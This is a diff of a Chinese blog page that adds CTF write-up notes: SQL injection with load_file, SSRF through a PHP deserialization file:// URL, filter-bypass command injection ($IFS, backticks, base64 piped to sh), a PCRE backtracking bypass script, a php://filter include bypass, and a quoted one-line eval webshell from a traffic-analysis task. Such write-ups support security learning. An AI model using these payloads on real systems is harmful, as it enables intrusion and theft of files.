@@ -16,24 +16,27 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="cui">
+  <meta name="author" content="sincui">
   <meta name="keywords" content="">
   
-    <meta name="description" content="你还dklsadlkasd活动空间ASHD空间ASHDJ看AS·撒旦克里夫SDKL：F。">
+    <meta name="description" content="[网鼎杯 2020青龙组]Notes第一种：sql注入中load_file()函数的使用 前提: oad_file函数只有在满足两个条件的情况下才可以使用： 1、文件权限：chmod a+x pathtofile 2、文件大小：必须小于max_allowed_packet 3、必须指定文件完整的路径 通过robots协议下载后发现源码 1234567891011121314151617181920">
 <meta property="og:type" content="article">
 <meta property="og:title" content="susu">
 <meta property="og:url" content="http://example.com/2024/10/25/susu/index.html">
-<meta property="og:site_name" content="苏阳光dad">
-<meta property="og:description" content="你还dklsadlkasd活动空间ASHD空间ASHDJ看AS·撒旦克里夫SDKL：F。">
+<meta property="og:site_name" content="sin">
+<meta property="og:description" content="[网鼎杯 2020青龙组]Notes第一种：sql注入中load_file()函数的使用 前提: oad_file函数只有在满足两个条件的情况下才可以使用： 1、文件权限：chmod a+x pathtofile 2、文件大小：必须小于max_allowed_packet 3、必须指定文件完整的路径 通过robots协议下载后发现源码 1234567891011121314151617181920">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/10/25/susu/Users/13061/AppData/Roaming/Typora/typora-user-images/image-20241028182603134.png">
+<meta property="og:image" content="http://example.com/2024/10/25/susu/Users/13061/AppData/Roaming/Typora/typora-user-images/image-20241031200724576.png">
 <meta property="article:published_time" content="2024-10-25T14:33:36.000Z">
-<meta property="article:modified_time" content="2024-10-25T14:39:48.936Z">
-<meta property="article:author" content="cui">
+<meta property="article:modified_time" content="2024-10-31T14:03:43.598Z">
+<meta property="article:author" content="sincui">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/10/25/susu/Users/13061/AppData/Roaming/Typora/typora-user-images/image-20241028182603134.png">
   
   
   
-  <title>susu - 苏阳光dad</title>
+  <title>susu - sin</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -110,7 +113,7 @@
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/">
-      <strong>sygdedie</strong>
+      <strong>Slncui</strong>
     </a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
@@ -235,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          17 字
+          2.1k 字
         
       </span>
     
@@ -246,7 +249,7 @@
         
         
         
-          1 分钟
+          18 分钟
         
       </span>
     
@@ -294,10 +297,138 @@
           <article class="post-content mx-auto">
             <h1 id="seo-header">susu</h1>
             
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年10月31日 晚上
+                  
+                
+              </p>
+            
             
               <div class="markdown-body">
                 
-                <h3 id="你还dklsadlkasd"><a href="#你还dklsadlkasd" class="headerlink" title="你还dklsadlkasd"></a>你还dklsadlkasd</h3><p>活动空间ASHD空间ASHDJ看AS·撒旦克里夫SDKL：F。</p>
+                <h3 id="网鼎杯-2020青龙组-Notes"><a href="#网鼎杯-2020青龙组-Notes" class="headerlink" title="[网鼎杯 2020青龙组]Notes"></a>[网鼎杯 2020青龙组]Notes</h3><h3 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h3><h5 id="sql注入中load-file-函数的使用"><a href="#sql注入中load-file-函数的使用" class="headerlink" title="sql注入中load_file()函数的使用"></a>sql注入中load_file()函数的使用</h5><p><img src="/2024/10/25/susu/Users\13061\AppData\Roaming\Typora\typora-user-images\image-20241028182603134.png" srcset="/img/loading.gif" lazyload alt="image-20241028182603134"></p>
+<p>前提: oad_file函数只有在满足两个条件的情况下才可以使用：</p>
+<p>1、文件权限：chmod a+x pathtofile</p>
+<p>2、文件大小：必须小于max_allowed_packet</p>
+<p>3、必须指定文件完整的路径</p>
+<p>通过robots协议下载后发现源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(load_file(<span class="hljs-string">&#x27;/var/www/html/flag.php&#x27;</span>)),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <br><br>load_file(<span class="hljs-string">&#x27;/var/www/html/flag.php&#x27;</span>)`: 这个函数用于从服务器文件系统读取文件的内容。在这个例子中，它尝试读取 `flag.php` 文件的内容。<br></code></pre></td></tr></table></figure>
+
+<h3 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h3><p>注册用户之后发现sql注入，union select被过滤 用union&#x2F;**&#x2F;select</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> # 四个字段<br>库<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <br>表<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-comment">/*!SelEct*/</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-built_in">column_name</span>,<span class="hljs-string">&#x27;~&#x27;</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br>字段<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br>数据<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;fakebook&#x27;</span># <br><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>根据源码构造序列化<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfo</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-string">&#x27;admin888&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;age = <span class="hljs-number">12</span>;<br><span class="hljs-variable">$a</span>-&gt;blog = <span class="hljs-string">&#x27;file:///var/www/html/user.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;admin888&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">12</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/user.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="tee-exec"><a href="#tee-exec" class="headerlink" title="tee  exec()"></a>tee  <strong>exec()</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>|管道输出符  将前一个命令的输出传递给 <code>tee</code> 命令。</p>
+<p>tee命令用于读取标准输入的数据，并将其内容输出成文件。</p>
+<p>tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?url=l\s / |tee <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">/?url=tac /flllll\aaaaaaggggggg |tee 2.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="正则匹配回溯绕过"><a href="#正则匹配回溯绕过" class="headerlink" title="正则匹配回溯绕过"></a><strong>正则匹配回溯绕过</strong></h2><p>这样匹配就实现了回溯，<strong>这里回溯有一个回溯限制次数——100 万次</strong></p>
+<p> <strong>当回溯超出这个次数，还没吐完的字符串就可以逃逸匹配</strong></p>
+<p>利用这个特性我们可以逃逸我们想要的语句，只要在我们的语句后加上100万个字符即可</p>
+<p>等匹配超过这个次数时我们的语句自然就可以逃逸掉了</p>
+<p>payload:</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> requests<br><span class="hljs-title">url</span> = &#x27;http://<span class="hljs-number">1.14</span>.<span class="hljs-number">71.254</span>:<span class="hljs-number">28288</span>/&#x27;<br><span class="hljs-title">payload</span> = &#x27;&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;?&gt;&lt;?=`sort /f*`?&gt;&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>:<span class="hljs-string">&quot;&#x27; + &quot;</span>-<span class="hljs-string">&quot; * 1000000 + &#x27;&quot;</span>&#125;&#x27;<br><span class="hljs-title">res</span> = requests.post(url=url, <span class="hljs-class"><span class="hljs-keyword">data</span>=&#123;&quot;<span class="hljs-title">letter</span>&quot;: <span class="hljs-title">payload</span>&#125;)</span><br><span class="hljs-title">print</span>(res.text)<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="NSSCTF-陇剑杯-2021-webshell-问-1-7"><a href="#NSSCTF-陇剑杯-2021-webshell-问-1-7" class="headerlink" title="NSSCTF[陇剑杯 2021]webshell 问(1~7)"></a>NSSCTF[陇剑杯 2021]webshell 问(1~7)</h1><p>查看登录系统使用的密码是_____________</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;password&quot;</span> 查看HTTP中有password的流量包<br></code></pre></td></tr></table></figure>
+
+<p>(2)修改了一个日志文件，文件的绝对路径为_____________</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;.log&quot;</span>查看HTTP中有.<span class="hljs-built_in">log</span>的流量包.<br></code></pre></td></tr></table></figure>
+
+<p>在流量包中发现data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log 日志文件</p>
+<p>后续流量包，其中存在命令执行pwd，查看http流，可以准确的得到网站目录为&#x2F;var&#x2F;www&#x2F;html </p>
+<p>(3)http contains “whoami”查看http协议中包含whoami（查看当前用户的命令）的流量包</p>
+<p>在317发现whoami但是在319有响应</p>
+<p>(4)黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">上传webshell基本使用POST方法提交，然后再<span class="hljs-number">337</span>个包发现<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>经过分析确定为黑客写入的webshell<br>base <span class="hljs-number">64</span>编码了，其实搜索echo也可以<br>Value: <span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4=|base64 -d &gt; /var/www/html/1.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>(5)问五：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答： 黑客上传的代理工具客户端名字是_____________。</p>
+<p>http contains “1.php”过滤http协议中包含的1.php，右击数据包查看http流，直接查看黑客进行的操作进行分析,通过分析发现345流量包对比341流量包回显的数据中多了一个frpc.ini文件，猜测该文件为黑客上传的代理工具</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76690905/article/details/135037053">https://blog.csdn.net/2301_76690905/article/details/135037053</a></p>
+<h1 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h1><p>题目页面给了一条flag路径，先试着POST传参进去，使用php为协议，但是发现提示有waf，先看看index.php看看条件base64解码后得到php代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nssctf waf!&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br></code></pre></td></tr></table></figure>
+
+<p>根据上面得到的代码，我们可以知道当读取的长度大于等于800时即可绕过WAF，因此构造payload如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag=800个字符&amp;flag=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/10/25/susu/Users\13061\AppData\Roaming\Typora\typora-user-images\image-20241031200724576.png" srcset="/img/loading.gif" lazyload alt="image-20241031200724576">
+
+<h1 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h1><p>知识点:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">命令执行<br>linux空格绕过<br>反引号绕过       变量绕过          <span class="hljs-built_in">base64</span>编码绕过<br></code></pre></td></tr></table></figure>
+
+<p>打开页面提示 “听说php可以执行系统函数？我来康康”</p>
+<p>输入127.0.0.1</p>
+<p>因为提示是命令执行,并且会执行ping操作,用;分隔命令,输入 </p>
+<p>127.0.0.1;ls</p>
+<p>发现回显了两个文件flag.php 和 index.php 也说明是linux环境,查看一下flag.php文件</p>
+<p>输入127.0.0.1;cat flag.php 报错fxck your space!</p>
+<p>说明是过滤了空格<br>#${IFS}  $IFS$1  %09  %20  ${IFS  &lt;重定向符号 有时候都可以替代空格 就看题目过滤了什么符号</p>
+<p>尝试之后发现$IFS$1可以  最后的1可以是其他数字,效果是一样的</p>
+<p>bjut.edu.cn;cat$IFS$1flag.php</p>
+<p>回显fxck your flag! flag也被过滤了<br>那就查看一下index.php文件,发现里面是源代码</p>
+<pre><code class="hljs">if(isset($_GET[&#39;ip&#39;]))&#123;
+        $ip = $_GET[&#39;ip&#39;];
+        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
+            print_r($match);
+            print($ip);
+            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
+            die(&quot;fxck your symbol!&quot;);
+        &#125;
+        else if(preg_match(&quot;/ /&quot;, $ip))&#123;
+            die(&quot;fxck your space!&quot;);
+        &#125;
+        else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
+            die(&quot;fxck your bash!&quot;);
+        &#125;
+        else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
+            #检查字符串中是否分别含有 &#39;f&#39;, &#39;l&#39;, &#39;a&#39;, &#39;g&#39; 这四个字母,无论这四个字母之间有多少或什么其他的字符,而且它们出现的顺序与 &quot;flag&quot; 字符串中的顺序相同
+            die(&quot;fxck your flag!&quot;);
+        &#125;
+        $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+        echo &quot;&quot;;
+        print_r($a);
+    &#125;
+</code></pre>
+<h5 id="方法一-反引号绕过"><a href="#方法一-反引号绕过" class="headerlink" title="方法一: 反引号绕过"></a>方法一: 反引号绕过</h5><p>其中过滤了很多符号,但是没有过滤反引号&#96;&#96;</p>
+<p>使用反引号绕过  127.0.0.1;cat$IFS$1<code>ls</code> (先执行&#96;&#96;里面的代码,绕过输入flag的限制)</p>
+<p>然后f12查看源码得到被注释的flag</p>
+<h5 id="方法二-变量绕过"><a href="#方法二-变量绕过" class="headerlink" title="方法二:变量绕过"></a>方法二:变量绕过</h5><p>例如a&#x3D;l;b&#x3D;s;$a$b  就会执行ls<br>输入框输入   127.0.0.1;x&#x3D;f;cat$IFS$1$xlag.php<br>这种情况会显示fuck flag,即被过滤,因为整个字符串参数ip中 f l a g 顺序出现</p>
+<pre><code class="hljs">127.0.0.1;x=l;cat$IFS$1f$xag.php    没被过滤,但是不回显flag
+127.0.0.1;x=a;cat$IFS$1fl$xg.php    也是一样不回显flag
+127.0.0.1;x=g;cat$IFS$1fla$x.php    查看源码得到flag
+127.0.0.1;x=ag;cat$IFS$1fl$x.php    查看源码也可以得到flag
+127.0.0.1;x=lag;cat$IFS$1f$x.php    查看源码也可以得到flag
+</code></pre>
+<p>这里我的理解是f$xag.php  和 fl$xg.php 不回显flag 是因为把原本的参数$x 当成了$xag 和  $xg<br>所以要把参数放在最后才会识别为$x</p>
+<h5 id="方法三-base64编码绕过"><a href="#方法三-base64编码绕过" class="headerlink" title="方法三:base64编码绕过"></a>方法三:base64编码绕过</h5><p>这里还可以将cat flag.php进行base64编码<br>得到Y2F0IGZsYWcucGhw       再用base64-d命令来执行<br>虽然过滤了bash但大部分命令仍然可以用sh来代替执行</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS-d|sh<br></code></pre></td></tr></table></figure>
+
+<p>使用 echo命令使得cat flag.php的base64编码被正确地作为输入参数传递给 base64 -d</p>
+<p>即前面的  echo$IFS$1Y2F0IGZsYWcucGhw  作为管道符的输入</p>
+<p>同样可以使用反引号&#96;&#96;配合base64编码绕过,这样不需要使用sh</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;`echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$<span class="hljs-number">1</span>-d`<br></code></pre></td></tr></table></figure>
+
+
 
                 
               </div>
@@ -322,7 +453,7 @@
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>cui</div>
+          <div>sincui</div>
         </div>
       
       
@@ -360,9 +491,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/27/11/" title="11">
+                      <a href="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="数据库基础知识">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">11</span>
+                        <span class="hidden-mobile">数据库基础知识</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -370,8 +501,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/24/hello-world/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
